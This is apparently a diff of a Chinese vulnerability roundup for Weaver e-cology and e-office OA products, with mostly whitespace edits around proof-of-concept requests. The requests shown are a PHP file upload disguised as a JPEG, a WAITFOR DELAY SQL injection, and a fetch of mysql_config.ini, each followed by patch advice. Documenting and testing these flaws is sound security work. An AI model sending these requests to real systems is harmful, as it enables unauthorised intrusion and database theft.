@@ -23,7 +23,7 @@ cve: "CVE-2023-2523"
     
 *   泛微 OA e-cology 前台接口 SQL 注入漏洞 7
     
-*   泛微 e-cology  ofsLogin 任意用户登录漏洞 8
+*   泛微 e-cology  ofsLogin 任意用户登录漏洞 8
     
 *   泛微 E-Cology /CheckServer.jsp 路径 SQL 注入漏洞 (QVD-2023-9849)9
     
@@ -85,19 +85,19 @@ Content-Type:application/octet-stream
 **POC**：
 
 ```
-POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
+POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
 Host:***
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: null
-Content-Type: multipart/form-data; boundary=-WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
-Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=-WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Connection: close
 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-Content-Disposition: form-data; 
-Content-Type: image/jpeg
-<?php phpinfo();?>
+Content-Disposition: form-data; 
+Content-Type: image/jpeg
+<?php phpinfo();?>
 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
 
 ```
@@ -119,10 +119,10 @@ Content-Type: image/jpeg
 **POC**：  
 
 ```
-GET /weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1 HTTP/1.1
+GET /weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1 HTTP/1.1
 Host:***
 Accept:*/*
-Connection: close
+Connection: close
 
 ```
 
@@ -269,7 +269,7 @@ formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%
 
 **修复建议**：官网已更新补丁  
 
-**7. 泛微 e-cology  ofsLogin 任意用户登录漏洞**
+**7. 泛微 e-cology  ofsLogin 任意用户登录漏洞**
 
 泛微 e-cology 是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台。泛微 e-cology 前台任意用户登录漏洞：泛微 e-cology9 部分版本中存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。
 
@@ -297,7 +297,7 @@ https://www.weaver.com.cn/cs/securityDownload.asp#
 
 **8. 泛微 E-Cology /CheckServer.jsp 路径 SQL 注入漏洞 (QVD-2023-9849)**
 
-泛微 Ecology OA 系统对用户传入的数据过滤处理不当，导致存在 SQL 注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意 SQL 指令，从而窃取数据库敏感信息。
+泛微 Ecology OA 系统对用户传入的数据过滤处理不当，导致存在 SQL 注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意 SQL 指令，从而窃取数据库敏感信息。
 
 **漏洞编号**：QVD-2023-9849
 
@@ -365,7 +365,7 @@ https://service.e-office.cn/download
 **POC**：
 
 ```
-GET /mysql_config.ini HTTP/1.1
+GET /mysql_config.ini HTTP/1.1
 Content-Type: application/josn
 
 ```
